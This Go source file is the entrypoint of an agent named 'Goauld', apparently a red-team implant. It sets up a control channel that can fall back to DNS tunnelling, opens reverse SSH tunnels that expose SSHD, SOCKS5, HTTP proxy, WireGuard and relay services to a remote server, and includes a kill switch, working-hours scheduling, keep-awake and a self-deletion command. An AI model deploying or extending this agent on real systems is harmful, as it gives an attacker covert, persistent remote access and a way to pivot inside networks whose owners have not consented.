//go:build !mini

// Package main holds the agent entrypoint
package main

import (
	globalcontext "Goauld/agent/context"
	"Goauld/agent/control"
	"Goauld/agent/keepawake/keepawake"
	"Goauld/agent/proxy"
	"Goauld/agent/relay"
	"Goauld/agent/ssh/transport"
	"Goauld/agent/vscode"
	"Goauld/agent/wireguard"
	"Goauld/agent/wireguard/udptunnel"
	"Goauld/common"
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"Goauld/agent/config"
	"Goauld/agent/socks"
	"Goauld/agent/ssh"
	"Goauld/agent/sshd"
	"Goauld/common/log"
	commonssh "Goauld/common/ssh"

	"github.com/cenkalti/backoff/v5"
)

var globalCanceler *globalcontext.GlobalCanceler

// Main :
//
//export Main
func Main() {
	main()
}

// main :
//
//export main
func main() {
	// Initialize the agent using the provided parameters (Command line, configuration file, environment variable)
	_, warnings, err := config.InitAgent()
	if err != nil {
		log.Error().Err(err).Msg("error initializing the agent")

		return
	}

	if len(config.Get().IgnoredArgs()) > 0 {
		log.Warn().Strs("Args", config.Get().IgnoredArgs()).Msg("ignored arguments")
	}
	if config.Get().DoPrintVersion() {
		//nolint:forbidigo
		fmt.Println(common.GetVersion())

		return
	}
	if len(warnings) > 0 {
		for _, warning := range warnings {
			log.Warn().Err(warning).Msgf("agent init error")
		}
	}
	if config.Get().ShouldRunInBackground() {
		err := config.Get().StartInBackground()
		if err != nil {
			log.Error().Err(err).Msg("error starting the agent in background")
		}

		return
	}
	if config.Get().DoGenerateConfig() {
		conf, err := config.Get().GenerateYAMLConfig()
		if err != nil {
			log.Error().Err(err).Msg("error generating the agent config")

			return
		}
		//nolint:forbidigo
		fmt.Println(conf)

		return
	}
	killSwitchDuration := KillSwitchLoop(config.Get().GetKillSwitchDays(), globalCanceler)
	// Define an operation function that returns a value and an error.
	// The value can be any type.
	// We'll pass this operation to Retry function

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	operation := func() (any, error) {
		log.Info().Msg("Starting agent")
		if config.Get().IsOutOfWorkingDay() {
			LogNextStart()

			return nil, backoff.RetryAfter(60)
		}
		cancelReason := run()
		if cancelReason.Status == globalcontext.Delete {
			err := ScheduleDelete()
			if err != nil {
				log.Error().Err(err).Msg("error while deleting the agent")
			}
		}

		if cancelReason.Status == globalcontext.Exit || cancelReason.Status == globalcontext.Delete {
			log.Kill().Str("Reason", cancelReason.Msg).Msg("Agent stopped")
			cancel()
			err := vscode.Cleanup()
			if err != nil {
				log.Warn().Err(err).Msg("error cleaning up VSCode after agent exit")
			}
			time.Sleep(time.Second)

			//nolint:nilnil
			return nil, nil
		}
		log.Reset().Str("Reason", cancelReason.Msg).Msg("Agent restarting")

		return nil, fmt.Errorf("agent restarting: %s", cancelReason.Msg)
	}

	exp := &backoff.ExponentialBackOff{
		InitialInterval:     time.Second,
		RandomizationFactor: 2,
		Multiplier:          1.5,
		MaxInterval:         5 * time.Minute,
	}
	result, err := backoff.Retry(
		ctx,
		operation,
		backoff.WithBackOff(exp),
		backoff.WithMaxTries(config.Get().GetMexRetries()),
		backoff.WithMaxElapsedTime(killSwitchDuration),
		backoff.WithNotify(func(_ error, _ time.Duration) {

		}),
	)
	if err != nil {
		log.Info().Err(err).Msg("Agent shut down")

		return
	}
	if result != nil {
		//nolint:forbidigo
		fmt.Println(result)
	}
}

func run() globalcontext.CancelReason {
	dnsTransport := transport.NewDNSSH()
	cancelReason := make(chan globalcontext.CancelReason)
	controlErr := make(chan error)
	sshdErr := make(chan error)
	sshErr := make(chan error)
	socksErr := make(chan error)
	httpProxyErr := make(chan error)

	var forwardedPorts []commonssh.RemotePortForwarding

	// configDone is a one time chan used to signal that the configuration exchange with the server is completed.
	// The signal is emitted by the socket.io handler, and the agent waits for it before starting component initialization
	// (sshd, ssh, socks, etc.)
	configDone := make(chan string)
	log.Info().Msg("Agent init done")

	ctx, cancel := context.WithCancel(context.Background())
	globalCanceler = &globalcontext.GlobalCanceler{
		Cancel:       cancel,
		CancelReason: cancelReason,
	}
	defer cancel()

	var err error

	controlInitStrategy["DNS"] = control.InitStrategy{
		Name:     "DNS",
		InitFunc: ClosureInitControlOverDNS(dnsTransport),
	}

	success, controlPlanClient := InitControl(ctx, globalCanceler, configDone, controlErr)

	// If no strategy was successful, we restart the agent
	if !success {
		return globalcontext.CancelReason{
			Status: globalcontext.Restart,
			Msg:    "unable to init the control plan",
		}
	}

	if dnsTransport.Started {
		defer func(dnsTransport *transport.DNSSH) {
			err := dnsTransport.Close()
			if err != nil {
				log.Debug().Err(err).Msg("error while closing dns transport")
			}
		}(dnsTransport)
	}

	cancelCtrlC := HandleCtrlC(controlPlanClient, globalCanceler)
	defer cancelCtrlC()

	if config.Get().WGEnabled() {
		err := config.Get().GenerateWireguardConfig()
		if err != nil {
			log.Error().Err(err).Msg("error initializing the Wireguard configuration")
			config.Get().DisableWG()
		}
	}

	go func() {
		// Waiting for the configuration to be completed
		<-configDone

		// Create the client SSH
		sshAgent := ssh.NewSSHAgent()
		// defer sshAgent.Close()
		// Initialize the client SSH
		err = sshAgent.Init(ctx, dnsTransport)
		config.Get().SSHTunnelMode = strings.ToLower(sshAgent.Mode)
		if err != nil {
			log.Error().Err(err).Msg("error initializing the SSH")
			globalCanceler.Restart("unable to init the SSH connection")

			return
		}

		// If the SSHD server is enabled, start it
		if config.Get().SshdEnabled() {
			sshdServer := sshd.NewSshdServer(ctx, globalCanceler)

			rListener, rPort, err := sshAgent.GetRemoteConn(config.Get().RemoteForwardedSshdAddress())
			if err != nil {
				log.Error().Err(err).Msg("error initializing the SSHD connection")

				return
			}
			config.Get().UpdateSshdPort(rPort)

			go func() {
				select {
				case sshdErr <- sshdServer.Serve(rListener):
					if err != nil {
						log.Error().Err(err).Msg("socks server error")
					}
					err := sshdServer.Close()
					if err != nil {
						log.Warn().Err(err).Msg("sshd close error")
					}
				case <-ctx.Done():

					log.Info().Msg("Closing SSHD connection")
					err := sshdServer.Close()
					if err != nil {
						log.Warn().Err(err).Msg("sshd close error")
					}
				}
			}()
			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote SSHD server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: config.Get().RemoteForwardedSshdPort(),
				AgentPort:  -1,
				AgentIP:    "0.0.0.0",
				Tag:        "SSHD",
			})
		}

		// If the socks5 server is enabled, start it
		if config.Get().SocksEnabled() {
			socks5, err := socks.NewSocks()
			if err != nil {
				log.Error().Err(err).Msg("error initializing the Socks5 server")
			}
			rListener, rPort, err := sshAgent.GetRemoteConn(config.Get().RemoteForwardedSocksAddress())
			if err != nil {
				log.Error().Err(err).Msg("error initializing the Socks5 connection")
			}
			config.Get().UpdateSocksPort(rPort)
			go func() {
				select {
				case socksErr <- socks5.Serve(rListener):
					if err != nil {
						log.Error().Err(err).Msg("socks server error")
					}
					err := socks5.Close()
					if err != nil && !errors.Is(err, io.EOF) {
						log.Warn().Err(err).Msg("socks close error")
					}
				case <-ctx.Done():
					err := socks5.Close()
					if err != nil && !errors.Is(err, io.EOF) {
						log.Warn().Err(err).Msg("socks close error")
					}
				}
			}()
			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote Socks5 server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: config.Get().RemoteForwardedSocksPort(),
				AgentPort:  -1,
				AgentIP:    "0.0.0.0",
				Tag:        "SOCKS",
			})
		}

		// If the HTTP proxy server is enabled, start it
		if config.Get().HTTPProxyEnabled() {
			httpProxy := proxy.InitHTTPProxy()

			listener, err := net.Listen("tcp4", "127.0.0.1:0")
			//nolint:forcetypeassert
			port := listener.Addr().(*net.TCPAddr).Port
			if err != nil {
				log.Error().Err(err).Msg("error initializing the HTTP proxy connection")
			}
			rpf := commonssh.RemotePortForwarding{
				ServerPort: 0,
				AgentPort:  port,
				AgentIP:    "127.0.0.1",
				Tag:        "HTTP",
			}
			rPort, err := sshAgent.RemoteForward(ctx, rpf)

			config.Get().UpdateHTTPProxyPort(rPort)

			go func() {
				select {
				case httpProxyErr <- httpProxy.Server.Serve(listener):
					if err != nil {
						log.Error().Err(err).Msg("HTTP proxy server error")
					}
					err := httpProxy.Server.Close()
					if err != nil {
						log.Warn().Err(err).Msg("HTTP proxy close error")
					}
				case <-ctx.Done():
					err := httpProxy.Server.Close()
					if err != nil {
						log.Warn().Err(err).Msg("HTTP proxy close error")
					}
				}
			}()

			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote HTTP proxy server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: config.Get().RemoteForwardedHTTPProxyPort(),
				AgentPort:  -1,
				AgentIP:    "0.0.0.0",
				Tag:        "HTTP",
			})
		}

		if config.Get().WGEnabled() {
			wg := wireguard.NewWireguard()
			err := wg.Init(config.Get().Wireguard)
			if err != nil {
				log.Error().Err(err).Msg("error initializing the wireguard server")
			}
			rListener, rPort, err := sshAgent.GetRemoteConn(config.Get().RemoteForwardedWGAddress())
			if err != nil {
				log.Error().Err(err).Msg("error initializing the wireguard connection")

				return
			}
			config.Get().UpdateWGPort(rPort)

			log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Wiregard listener server started")
			forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
				ServerPort: rPort,
				AgentPort:  0,
				AgentIP:    "127.0.0.1",
				Tag:        "WG",
			})
			go func() {
				for {
					conn, err := rListener.Accept()
					if err != nil {
						log.Error().Err(err).Msg("error accepting connection")

						return
					}

					go func() {
						log.Info().Str("Remote port", strconv.Itoa(rPort)).Msg("Remote wiregaurd forward started")
						err := udptunnel.HandleUDP(conn, fmt.Sprintf("127.0.0.1:%d", wg.ListenPort))
						if err != nil && !errors.Is(err, io.EOF) {
							log.Error().Err(err).Msg("udptunnel handle error")
						}
					}()
				}
			}()
			controlPlanClient.Wg = wg
		}
		// For all porte forwards, launch the forwarding
		rpf := config.Get().GetRemotePortForwarding()
		for i := range rpf {
			port, err := sshAgent.RemoteForward(ctx, rpf[i])
			if err != nil {
				log.Error().Err(err).Str("Local", rpf[i].GetLocal()).Str("Remote", rpf[i].GetRemote()).Msg("error initializing the port forwarding")

				continue
			}
			rpf[i].ServerPort = port
			forwardedPorts = append(forwardedPorts, rpf[i])
			log.Info().Str("Local", rpf[i].GetLocal()).Str("Remote", rpf[i].GetRemote()).Msg("Port forwarding started")
		}

		if config.Get().IsRelay() {
			relayer, err := relay.NewRelayRouter(
				ctx,
				config.Get().ControlTunnelMode,
				config.Get().SSHTunnelMode,
				dnsTransport,
			)
			if err != nil {
				log.Error().Err(err).Msg("error initializing the relay router")
			} else {
				forwardedPorts = append(forwardedPorts, commonssh.RemotePortForwarding{
					ServerPort: -1,
					AgentPort:  relayer.Port,
					AgentIP:    "",
					Tag:        "RELAY",
				})
				go func() {
					log.Info().Int("Port", relayer.Port).Msg("Relay listening on port")
					err := relayer.Serve()
					if err != nil {
						log.Error().Err(err).Msg("error serving the relay router")

						return
					}
				}()
			}
		}

		err := controlPlanClient.SendPorts(forwardedPorts)
		if err != nil {
			log.Error().Err(err).Msg("error sending the forwarded ports")
		} else {
			if config.Get().IsStaticPasswordDynamic {
				log.Run().Str("Control", config.Get().ControlTunnelMode).Str("Mode", sshAgent.Mode).Str("Password", config.Get().PrivateSshdPassword()).Msg("Agent successfully started.")
			} else {
				log.Run().Str("Control", config.Get().ControlTunnelMode).Str("Mode", sshAgent.Mode).Msg("Agent successfully started.")
			}
		}
	}()

	if config.Get().KeepAwake() {
		keepAwaker := keepawake.Keeper{}
		err := keepAwaker.StartIndefinite()
		if err != nil {
			log.Warn().Err(err).Msg("error starting the keep awake")
		}
		go func() {
			<-ctx.Done()
			err = keepAwaker.Stop()
			if err != nil {
				log.Warn().Err(err).Msg("keep awake close error")
			}
		}()
	}

	if config.Get().OnlyWorkingDays() {
		go OnlyWorkingDayLoop(ctx, globalCanceler)
	}
	// Wait for errors to occur and print them
	select {
	case err := <-controlErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the agent")
		}
	case err := <-sshdErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the sshd server")
		}
	case err := <-sshErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the ssh client")
		}
	case err := <-socksErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the socks server")
		}
	case err := <-httpProxyErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the http proxy")
		}
	case <-ctx.Done():
		log.Error().Err(ctx.Err())
	}
	reason := <-cancelReason

	return reason
}

func OnlyWorkingDayLoop(ctx context.Context, canceler *globalcontext.GlobalCanceler) {
	t := time.NewTicker(1 * time.Minute)
	defer t.Stop()
	for {
		select {
		case <-t.C:
			if config.Get().IsOutOfWorkingDay() {
				log.Warn().Msg("Agent is now running out of working day")
				canceler.Restart("Agent out of working day")
			}
		case <-ctx.Done():
			return
		}
	}
}

func LogNextStart() {
	next, now, err := config.Get().NextStart()
	if err != nil {
		log.Warn().Err(err).Msg("error getting the next start date")
		log.Warn().Str("Start", config.Get().StartTime()).Msgf("Agent is out of working day")
	} else {
		log.Warn().Time("Now", now).Time("Next Start", next).Msgf("Agent is out of working day")
	}
}

func ScheduleDelete() error {
	exe, err := os.Executable()
	if err != nil {
		log.Error().Err(err).Msg("error getting the exe path")

		return err
	}
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		//nolint:gosec
		cmd = exec.Command("cmd", "/c", fmt.Sprintf("timeout /T 5 >nul && del '%s'", exe))
	} else {
		//nolint:gosec
		cmd = exec.Command("sh", "-c", fmt.Sprintf("sleep 5  ; rm -f '%s'", exe))
	}

	return cmd.Start()
}

func ClosureInitControlOverDNS(dnsTransport *transport.DNSSH) func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
	return func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
		if !dnsTransport.Started {
			err := dnsTransport.Start()
			if err != nil {
				return err
			}
		}

		err := client.InitOverDNS(dnsTransport.ControlStream, success, chanErr)
		if err != nil {
			return err
		}

		// As the  control socket is established using DNS we consider that the only working protocol is DNS
		// so we set the RSSH protocol order to only DNS
		config.Get().SetRSSHOrder([]string{"DNS"})

		return nil
	}
}
